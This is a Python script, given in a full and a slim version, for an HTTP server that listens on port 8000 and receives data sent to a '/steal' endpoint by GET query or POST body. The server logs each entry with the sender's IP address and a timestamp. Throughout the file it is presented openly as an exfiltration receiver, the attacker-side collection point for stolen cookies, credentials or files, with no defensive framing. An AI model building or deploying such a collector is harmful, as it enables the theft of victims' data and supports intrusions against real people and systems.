#!/usr/bin/env python3

##
##
import os,sys,re
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote_plus

LOG_FILE = "exfiltrated_data.log"

def log_data(data, client_address):
    """Log the exfiltrated data with a timestamp and client IP to a log file."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    log_entry = f"[{timestamp}] {client_address}: {data}\n{'-'*80}\n"
    print(log_entry)
    with open(LOG_FILE, "ab") as f:
        # Write as binary to support binary data; add separator between entries.
        f.write(log_entry.encode('utf-8'))

class RobustExfiltrationHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests for the /steal endpoint."""
        parsed_path = urlparse(self.path)
        if parsed_path.path == "/steal":
            qs = parse_qs(parsed_path.query)
            raw_data = qs.get('data', [''])[0]
            # URL-decode the received data. unquote_plus handles spaces properly.
            data = unquote_plus(raw_data)
            
            # Log the data along with the client IP address
            log_data(data, self.client_address[0])
            
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=UTF-8")
            self.end_headers()
            self.wfile.write(b"Data received and logged.")
        else:
            self.send_error(404, "Endpoint not found.")

    def do_POST(self):
        """Optional: Handle POST requests if future payloads use POST for binary data."""
        parsed_path = urlparse(self.path)
        if parsed_path.path == "/steal":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            # You could decode or process post_data further if needed.
            log_data(post_data, self.client_address[0])
            
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=UTF-8")
            self.end_headers()
            self.wfile.write(b"Data received via POST and logged.")
        else:
            self.send_error(404, "Endpoint not found.")

    def log_message(self, format, *args):
        """Override to prevent default console logging if desired."""
        sys.stderr.write("%s - - [%s] %s\n" %
                         (self.client_address[0],
                          self.log_date_time_string(),
                          format%args))

def run_server(server_class=HTTPServer, handler_class=RobustExfiltrationHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Robust Exfiltration Server listening on port {port}...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down the server.")
        httpd.server_close()

if __name__ == "__main__":
    run_server(port=8000)

##
##

##
## slim version ##

#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class ExfiltrationHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        if parsed_path.path == "/steal":
            qs = parse_qs(parsed_path.query)
            data = qs.get('data', [''])[0]
            print("Exfiltrated data:", data)
            # Optionally, here you could trigger an email or further processing.
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Data received")
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    server_address = ('', 8000)  # listen on port 8000
    httpd = HTTPServer(server_address, ExfiltrationHandler)
    print("Exfiltration server listening on port 8000...")
    httpd.serve_forever()

##
##
